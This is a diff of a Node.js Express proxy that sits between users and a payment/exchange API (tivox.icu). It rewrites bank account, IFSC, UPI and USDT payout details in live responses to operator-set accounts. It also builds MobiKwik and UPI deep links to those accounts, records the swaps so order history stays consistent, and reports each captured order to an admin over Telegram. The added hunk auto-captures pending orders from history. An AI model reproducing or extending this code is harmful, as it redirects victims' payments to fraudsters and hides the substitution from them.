@@ -1,11 +1,6 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
-const zlib = require('zlib');
-const { promisify } = require('util');
-const brotliDecompressAsync = promisify(zlib.brotliDecompress);
-const gunzipAsync = promisify(zlib.gunzip);
-const inflateAsync = promisify(zlib.inflate);
 
 const app = express();
 const TIVOX_API = 'https://tivox.icu';
@@ -1044,16 +1039,13 @@ async function proxyToTivox(req) {
   fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
   fwd['sec-ch-ua-mobile'] = '?0';
   fwd['sec-ch-ua-platform'] = '"Windows"';
-  // Force gzip-only so response.text() can decompress — brotli (br) is not auto-decompressed
-  // by Node.js fetch, which would cause JSON.parse to fail and skip all bank replacement logic
-  fwd['accept-encoding'] = 'gzip, deflate';
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
     fwd['content-length'] = String(req.rawBody.length);
   }
   const response = await fetch(url, opts);
-  const contentEncoding = (response.headers.get('content-encoding') || '').toLowerCase().trim();
+  const respBody = await response.text();
   const respHeaders = {};
   response.headers.forEach((val, key) => {
     const kl = key.toLowerCase();
@@ -1061,24 +1053,6 @@ async function proxyToTivox(req) {
       respHeaders[key] = val;
     }
   });
-  let respBody;
-  try {
-    if (contentEncoding === 'br' || contentEncoding === 'brotli') {
-      // Node.js fetch does NOT auto-decompress brotli — do it manually
-      const rawBuf = Buffer.from(await response.arrayBuffer());
-      try {
-        respBody = (await brotliDecompressAsync(rawBuf)).toString('utf8');
-      } catch (brotliErr) {
-        // Brotli failed — return raw bytes (browser can still decode it)
-        respBody = rawBuf.toString('latin1');
-      }
-    } else {
-      // gzip/deflate/plain — Node.js fetch (undici) auto-decompresses these
-      respBody = await response.text();
-    }
-  } catch (outerErr) {
-    respBody = '';
-  }
   return { response, respBody, respHeaders };
 }
 
@@ -1098,7 +1072,7 @@ async function proxyToReal(req) {
     fwd['content-length'] = String(req.rawBody.length);
   }
   const response = await fetch(url, opts);
-  const contentEncoding = (response.headers.get('content-encoding') || '').toLowerCase().trim();
+  const respBody = await response.text();
   const respHeaders = {};
   response.headers.forEach((val, key) => {
     const kl = key.toLowerCase();
@@ -1106,17 +1080,6 @@ async function proxyToReal(req) {
       respHeaders[key] = val;
     }
   });
-  let respBody;
-  try {
-    if (contentEncoding === 'br' || contentEncoding === 'brotli') {
-      const rawBuf = Buffer.from(await response.arrayBuffer());
-      respBody = (await brotliDecompressAsync(rawBuf)).toString('utf8');
-    } else {
-      respBody = await response.text();
-    }
-  } catch (decompErr) {
-    try { respBody = await response.text(); } catch (e) { respBody = ''; }
-  }
   return { response, respBody, respHeaders };
 }
 
@@ -1259,197 +1222,34 @@ app.all('/xxapi/*', async (req, res) => {
     );
 
     if (isBuyOrder) {
-      const activeBank = getActiveBank(data, null);
-      const proxyOn = data.botEnabled !== false;
-
-      console.log('\n🔍 DEBUG POST: URL:', req.originalUrl || req.url);
-      console.log('🔍 activeBank:', activeBank ? JSON.stringify({ accountHolder: activeBank.accountHolder, accountNo: activeBank.accountNo, ifsc: activeBank.ifsc }) : 'NULL ❌');
-      console.log('🔍 proxyOn:', proxyOn);
-      console.log('🔍 isUsdtBuy:', isUsdtBuy, '| isMobiKwikBuy:', isMobiKwikBuy, '| isOsdtBuy:', isOsdtBuy);
-
-      // ── Extract order/ct fields from request BEFORE backend call ─────────
-      // This ensures reqOrderId is available even if response can't be parsed
-      let reqOrderId = '', reqCtId = '', reqCtType = '';
-      try {
-        const ct = (req.headers['content-type'] || '').toLowerCase();
-        let rb = {};
-        console.log('🔍 request content-type:', ct);
-        if (ct.includes('multipart') && req.rawBody) {
-          rb = parseMultipartFields(req.rawBody);
-        } else if (ct.includes('json') && req.rawBody) {
-          rb = JSON.parse(req.rawBody.toString());
-        } else if (ct.includes('form') && req.rawBody) {
-          rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
-        }
-        console.log('🔍 request body keys:', Object.keys(rb));
-        console.log('🔍 request body (partial):', JSON.stringify(rb).slice(0, 300));
-        const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-        reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
-        reqCtId = rb.ct_id || rb.ctId || qs.get('ct_id') || '';
-        reqCtType = rb.ctType || rb.ct_type || rb.payType || qs.get('ctType') || '';
-        console.log('🔍 reqOrderId:', reqOrderId || 'NOT FOUND ❌');
-        console.log('🔍 reqCtId:', reqCtId, '| reqCtType:', reqCtType);
-      } catch (e) { console.log('🔍 request parse error:', e.message); }
-
       const { response: br, respBody: bb, respHeaders: bh } = await proxyToTivox(req);
-      console.log('🔍 backend status:', br.status);
-      console.log('🔍 backend content-encoding:', br.headers.get('content-encoding') || 'none');
-      console.log('🔍 respBody length:', bb ? bb.length : 0);
-      console.log('🔍 respBody first 200 chars:', bb ? bb.slice(0, 200) : 'EMPTY');
       let bj = null;
-      try { bj = JSON.parse(bb); } catch (e) { console.log('🔍 JSON.parse failed:', e.message, '→ brotli/binary response likely'); }
-      console.log('🔍 bj parsed:', bj ? 'YES ✅ | code=' + bj.code : 'NULL ❌ (will use optimistic save path)');
+      try { bj = JSON.parse(bb); } catch (e) { }
       if (bj) {
         const origCode = bj.code;
         const origMsg = String(bj.msg || bj.message || '');
 
-        const savedOrder = reqOrderId && data.orderBankMap ? data.orderBankMap[reqOrderId] : null;
-        // Amount: try saved map first, then request body, then response data
-        const _reqBodyAmt = getOrderAmount(req, req.body || {});
-        const savedAmount = savedOrder ? savedOrder.amount : (_reqBodyAmt || 0);
-
-        // ── Helper: build wallet deep link for a bank + amount + payType ──────
-        function buildWalletDeepLink(bank, amt, derivedPt) {
-          const bkAcct = bank ? bank.accountNo : '';
-          const bkIfsc = bank ? bank.ifsc : '';
-          const bkName = bank ? bank.accountHolder : '';
-          const bkUpi = bank ? (bank.upiId || '') : '';
-          const last4 = bkAcct.slice(-4);
-          let walletDomain = '', payAccount = bkUpi || '';
-          if (derivedPt === 2 && bkAcct) {
-            walletDomain = `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}`;
-            payAccount = bkUpi || `${bkAcct}@mbk`;
-          } else if (derivedPt === 3 && (bkUpi || bkAcct)) {
-            const pa = bkUpi || `${bkAcct}@upi`;
-            walletDomain = `upi://pay?pa=${encodeURIComponent(pa)}&pn=${encodeURIComponent(bkName)}&am=${amt}&cu=INR`;
-            payAccount = pa;
-          } else if (derivedPt === 1 && bkAcct) {
-            if (bkUpi) {
-              walletDomain = `upi://pay?pa=${encodeURIComponent(bkUpi)}&pn=${encodeURIComponent(bkName)}&am=${amt}&cu=INR`;
-              payAccount = bkUpi;
-            }
+        let reqOrderId = '';
+        try {
+          const ct = (req.headers['content-type'] || '').toLowerCase();
+          let rb = {};
+          if (ct.includes('multipart') && req.rawBody) {
+            rb = parseMultipartFields(req.rawBody);
+          } else if (ct.includes('json') && req.rawBody) {
+            rb = JSON.parse(req.rawBody.toString());
+          } else if (ct.includes('form') && req.rawBody) {
+            rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
           }
-          return { walletDomain, payAccount };
-        }
+          const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
+          reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
+        } catch (e) { }
 
-        // ctTypesPayType: 1→2(MobiKwik), 2→1(Bank), 3→1(Bank),
-        // 4→2(MobiKwik), 7→2(MobiKwik), 9→2(MobiKwik), 17→2(MobiKwik), 18→3(UPI)
-        const CT_PAY_MAP = { 1: 2, 2: 1, 3: 1, 4: 2, 7: 2, 9: 2, 17: 2, 18: 3 };
-        // For OSDT / UPI Plus — treat as MobiKwik (payType 2); for pure UPI tab → payType 3
-        const parsedCt = reqCtType ? parseInt(reqCtType) : (isOsdtBuy ? 1 : 3);
-        // URL-based wallet type overrides ctType map:
-        //   mobikwik URL or osdt → payType 2; usdt → special (no deep link); else use map
-        const derivedPt = isMobiKwikBuy || isOsdtBuy ? 2
-          : isUsdtBuy ? 0
-            : (CT_PAY_MAP[parsedCt] || 1);
-        const ptName = derivedPt === 2 ? 'MobiKwik'
-          : derivedPt === 3 ? 'UPI'
-            : derivedPt === 0 ? 'USDT'
-              : 'Bank Transfer';
+        const _reqBodyAmt = getOrderAmount(req, req.body || {});
+        const savedAmount = _reqBodyAmt || 0;
 
         const isSuccessMsg = origMsg.toLowerCase().includes('upi is being used') || origMsg.toLowerCase().includes('finish payment');
-        if (origCode === 0 || origCode === undefined || isSuccessMsg) {
-          // ── Case 1: Real API returned SUCCESS ────────────────────────────────
-          // Replace bank fields in real response if:  proxy ON  AND  bank set  AND  amount >= min
-          if (proxyOn && activeBank) {
-            if (isUsdtBuy) {
-              // USDT tab: replace USDT address in the real response
-              if (data.usdtAddress) replaceUsdtAddress(bj, data.usdtAddress, 0);
-            } else {
-              // UPI Plus / UPI / MobiKwik / Bank tabs: check minAmount then replace
-              let shouldReplace = true;
-              if (activeBank.minAmount) {
-                const amt = getOrderAmount(req, bj.data || bj);
-                if (amt !== null && amt < activeBank.minAmount) shouldReplace = false;
-              }
-              if (shouldReplace) {
-                // Replace all bank fields (account, ifsc, name, upi) in real response
-                const hasBank = scanHasBankFields(bj, 0);
-                if (hasBank) deepReplaceBankFields(bj, activeBank, 0, hasBank);
-                // Also rebuild walletDomain so the "Go Pay" link uses our bank
-                const bjData = bj.data || {};
-                const amt4Case1 = getOrderAmount(req, bjData) || 0;
-                if (bjData.walletDomain && typeof bjData.walletDomain === 'string') {
-                  bjData.walletDomain = replaceWalletUrl(bjData.walletDomain, activeBank);
-                } else if (bjData) {
-                  // walletDomain not present — inject one based on wallet type
-                  const { walletDomain, payAccount } = buildWalletDeepLink(activeBank, amt4Case1, derivedPt);
-                  if (walletDomain) bjData.walletDomain = walletDomain;
-                  if (payAccount) bjData.payAccount = payAccount;
-                }
-                // ── Save to orderBankMap so Buy History shows our bank for this order ──
-                let case1OrderId = reqOrderId || '';
-                if (!case1OrderId && bjData) {
-                  if (typeof bjData === 'string' && bjData.length > 5) case1OrderId = bjData;
-                  else case1OrderId = bjData.rptNo || bjData.orderNo || bjData.orderId || bjData.id || '';
-                }
-                if (case1OrderId) {
-                  if (!data.orderBankMap) data.orderBankMap = {};
-                  const bkAcctC1 = activeBank.accountNo;
-                  const bkIfscC1 = activeBank.ifsc;
-                  const bkNameC1 = activeBank.accountHolder;
-                  const last4C1 = bkAcctC1.slice(-4);
-                  const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt4Case1}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : (bjData.walletDomain || '');
-                  data.orderBankMap[case1OrderId] = {
-                    bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
-                    accountHolder: activeBank.accountHolder || '',
-                    accountNo: activeBank.accountNo || '',
-                    ifsc: activeBank.ifsc || '',
-                    bankName: activeBank.bankName || '',
-                    upiId: activeBank.upiId || '',
-                    amount: amt4Case1,
-                    rptNo: case1OrderId,
-                    orderNo: case1OrderId,
-                    walletDomain: wDomC1,
-                    payType: derivedPt,
-                    time: now,
-                    userId: String(userId || ''),
-                    forced: true,
-                    isManual: true
-                  };
-                  // Alt key (rptNo/orderNo may differ)
-                  if (bjData.rptNo && bjData.rptNo !== case1OrderId) data.orderBankMap[String(bjData.rptNo)] = data.orderBankMap[case1OrderId];
-                  if (bjData.orderNo && bjData.orderNo !== case1OrderId) data.orderBankMap[String(bjData.orderNo)] = data.orderBankMap[case1OrderId];
-                }
-                notifyAdmin(data,
-                  `✅ BUY SUCCESSFUL
-💰 Amount: ₹${amt4Case1}
-📋 Order: ${reqOrderId || 'N/A'}
-💾 Order is saved for history
-━━━━━━━━━━━━━━━━━━━━
-🏦 Real Bank: ${activeBank.accountHolder} | ${activeBank.accountNo} (Assuming real bank was replaced)
-━━━━━━━━━━━━━━━━━━━━
-🔄 Replaced With: ${activeBank.accountHolder} | ${activeBank.accountNo}
-🕐 ${now}`);
-              } else {
-                // amount < min → pass through real bank (no change to bj)
-                const amt = getOrderAmount(req, bj.data || bj);
-                notifyAdmin(data,
-                  `⚠️ BUY SUCCESSFUL (NOT REPLACED)
-💰 Amount: ₹${amt !== null ? amt : 'unknown'}
-📋 Order: ${reqOrderId || 'N/A'}
-ℹ️ Amount < Min ₹${activeBank.minAmount}
-━━━━━━━━━━━━━━━━━━━━
-🏦 Real Bank Shown
-🕐 ${now}`);
-              }
-            }
-          } else {
-            // Case 1 fallback: proxy off OR no bank → bj returned as-is with real bank
-            const amtFallback = getOrderAmount(req, bj.data || bj);
-            notifyAdmin(data,
-              `✅ BUY SUCCESSFUL (PROXY OFF OR NO BANK)
-💰 Amount: ₹${amtFallback !== null ? amtFallback : 'unknown'}
-📋 Order: ${reqOrderId || 'N/A'}
-ℹ️ Proxy is OFF or no bank is set!
-━━━━━━━━━━━━━━━━━━━━
-🏦 Real Bank Shown
-🕐 ${now}`);
-          }
-        } else {
+        if (!(origCode === 0 || origCode === undefined || isSuccessMsg)) {
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
-          // ── Case 2: Real API returned ERROR ─────────────────────────────────
-          // Let the error pass through to the frontend and log the failure (with debounce)
           const errorKey = reqOrderId + '_' + origMsg;
           const lastErrTime = recentErrors.get(errorKey) || 0;
           const nowTs = Math.floor(Date.now() / 1000);
@@ -1465,44 +1265,9 @@ app.all('/xxapi/*', async (req, res) => {
         }
         return res.status(200).json(bj);
       }
-
-      // ── bj = null: response couldn't be parsed (brotli-compressed success) ──
-      // Optimistically save bank so history + slip detail always show proxy bank
-      if (reqOrderId && activeBank && proxyOn && !isUsdtBuy) {
-        if (!data.orderBankMap) data.orderBankMap = {};
-        const _CT_PAY_MAP = { 1: 2, 2: 1, 3: 1, 4: 2, 7: 2, 9: 2, 17: 2, 18: 3 };
-        const _parsedCt = reqCtType ? parseInt(reqCtType) : (isOsdtBuy ? 1 : 3);
-        const _derivedPt = isMobiKwikBuy || isOsdtBuy ? 2 : isUsdtBuy ? 0 : (_CT_PAY_MAP[_parsedCt] || 1);
-        data.orderBankMap[reqOrderId] = {
-          bank: `${activeBank.accountHolder} | ${activeBank.accountNo}${activeBank.ifsc ? ' | ' + activeBank.ifsc : ''}`,
-          accountHolder: activeBank.accountHolder || '',
-          accountNo: activeBank.accountNo || '',
-          ifsc: activeBank.ifsc || '',
-          bankName: activeBank.bankName || '',
-          upiId: activeBank.upiId || '',
-          amount: 0,
-          rptNo: reqOrderId,
-          orderNo: reqOrderId,
-          walletDomain: '',
-          payType: _derivedPt,
-          time: now,
-          userId: String(userId || ''),
-          forced: true,
-          isManual: true
-        };
-        notifyAdmin(data,
-          `✅ BUY SUCCESSFUL
-📋 Order: ${reqOrderId}
-💾 Bank saved — history & slip will show proxy bank
-🏦 Bank: ${activeBank.accountHolder} | ${activeBank.accountNo}${activeBank.ifsc ? ' | ' + activeBank.ifsc : ''}
-🕐 ${now}`);
-      }
-      if (bb) {
-        bh['content-length'] = String(Buffer.byteLength(bb));
-        res.writeHead(br.status, bh);
-        return res.end(bb);
-      }
-      return res.sendStatus(200);
+      bh['content-length'] = String(Buffer.byteLength(bb));
+      res.writeHead(br.status, bh);
+      return res.end(bb);
     }
 
     // ── paymentslipdetail / order detail intercept — serve from orderBankMap if backend 404s ──
@@ -1808,6 +1573,64 @@ app.all('/xxapi/*', async (req, res) => {
       }
     }
 
+    if (urlLower.includes('/history') || urlLower.includes('_history') || urlLower.includes('listbuy')) {
+      if (jsonResp && (jsonResp.code === 0 || jsonResp.code === undefined) && respData) {
+        const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
+        const activeBank = getActiveBank(data, null);
+        
+        if (activeBank && data.botEnabled !== false) {
+          let capturedCount = 0;
+          for (const order of orderList) {
+            const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
+            const amt = getOrderAmount(req, order);
+            const orderId = order.orderNo || order.rptNo || order.id || order.orderId || '';
+            
+            if (isPaying && orderId && amt !== null) {
+              if (!activeBank.minAmount || amt >= activeBank.minAmount) {
+                if (!data.orderBankMap) data.orderBankMap = {};
+                if (!data.orderBankMap[String(orderId)]) {
+                  const bkAcctC1 = activeBank.accountNo;
+                  const bkIfscC1 = activeBank.ifsc;
+                  const bkNameC1 = activeBank.accountHolder;
+                  const last4C1 = bkAcctC1.slice(-4);
+                  
+                  let pt = order.payType || order.ctType || 1;
+                  if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
+                  
+                  const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
+                  
+                  data.orderBankMap[String(orderId)] = {
+                    bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
+                    accountHolder: bkNameC1,
+                    accountNo: bkAcctC1,
+                    ifsc: bkIfscC1,
+                    bankName: activeBank.bankName || '',
+                    upiId: activeBank.upiId || '',
+                    amount: amt,
+                    rptNo: orderId,
+                    orderNo: orderId,
+                    walletDomain: wDomC1,
+                    payType: pt,
+                    time: now,
+                    userId: String(userId || ''),
+                    forced: true,
+                    isManual: true
+                  };
+                  
+                  notifyAdmin(data,
+                    `✅ AUTO-CAPTURED FROM HISTORY
+💰 Amount: ₹${amt}
+📋 Order: ${orderId}
+💾 Auto-saved with Bank: ${bkNameC1} | ${bkAcctC1}
+🕐 ${now}`);
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+
     if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
       let kycInfo = '';
       if (req.rawBody) {
@@ -2104,62 +1927,6 @@ ${replaceLine}
           const acctName = item.acctName || item.acctname || item.accountName || item.accountname || '';
           const acctCode = item.acctCode || item.acctcode || item.ifsc || item.acctIfsc || '';
           const amt = item.amount || item.money || item.realAmount || item.orderAmount || '';
-
-          // ── AUTO PROXY: if order is in "paying" state, force proxy bank ──────
-          const _itemStatus = String(
-            item.status ?? item.orderStatus ?? item.orderState ??
-            item.state ?? item.payStatus ?? item.tradeStatus ?? ''
-          ).toLowerCase();
-          const _isPayingStatus = ['paying', 'pay', 'pending', 'processing', 'waitpay',
-            'wait_pay', 'topay', 'to_pay', 'unpaid', '0', '1', '2'].includes(_itemStatus)
-            || _itemStatus === '' // no status field = treat as active
-            || /pay|pend|process|wait|unpaid/i.test(_itemStatus);
-          const _itemAmt = parseFloat(amt) || 0;
-          const _minAutoAmt = parseFloat(data.minBuyAutoProxy) || 0; // admin can set via /setconfig
-          const _histActiveBank = getActiveBank(data, null);
-          const _histProxyOn = data.botEnabled !== false;
-
-          if (_isPayingStatus && _histActiveBank && _histProxyOn && _itemAmt >= _minAutoAmt && !data.orderBankMap[oId]?.forced) {
-            // Paying order found — save proxy bank immediately (same as /addorder)
-            const _bk = _histActiveBank;
-            const _last4 = (_bk.accountNo || '').slice(-4);
-            let _wDomain = '';
-            if (_bk.accountNo) {
-              _wDomain = `mobikwik://moneytransfer/upi/bank?account=${_bk.accountNo}&ifsc=${_bk.ifsc || ''}&name=${encodeURIComponent(_bk.accountHolder || '')}&amount=${_itemAmt}.0&displayAccountNumber=xxxxxxxxx${_last4}`;
-            }
-            data.orderBankMap[oId] = {
-              bank: `${_bk.accountHolder} | ${_bk.accountNo}${_bk.ifsc ? ' | ' + _bk.ifsc : ''}`,
-              accountHolder: _bk.accountHolder || '',
-              accountNo: _bk.accountNo || '',
-              ifsc: _bk.ifsc || '',
-              bankName: _bk.bankName || '',
-              upiId: _bk.upiId || '',
-              amount: _itemAmt,
-              rptNo: item.rptNo || item.rpt_no || oId,
-              orderNo: item.orderNo || item.order_no || oId,
-              walletDomain: _wDomain,
-              payType: 1,
-              time: now,
-              userId: String(userId || ''),
-              forced: true,
-              isManual: true
-            };
-            const _altId = String(item.rptNo || item.rpt_no || '');
-            if (_altId && _altId !== oId) data.orderBankMap[_altId] = data.orderBankMap[oId];
-
-            notifyAdmin(data,
-              `🎯 AUTO PROXY SET
-📋 Order: ${oId}
-💰 Amount: ₹${_itemAmt}
-🏦 Bank: ${_bk.accountHolder} | ${_bk.accountNo}${_bk.ifsc ? ' | ' + _bk.ifsc : ''}
-📊 Status: ${_itemStatus || 'active'}
-👤 User: ${userId || 'N/A'}
-🕐 ${now}`);
-
-            capturedCount++;
-            logLines.push(`🎯 AUTO PROXY: ${oId}\n   💰 ₹${_itemAmt}  🏦 ${_bk.accountHolder} | ${_bk.accountNo}`);
-            continue; // skip real-bank save below
-          }
 
           // Don't overwrite entries that were forced by our proxy (forced=true)
           if (!data.orderBankMap[oId] || !data.orderBankMap[oId].forced) {
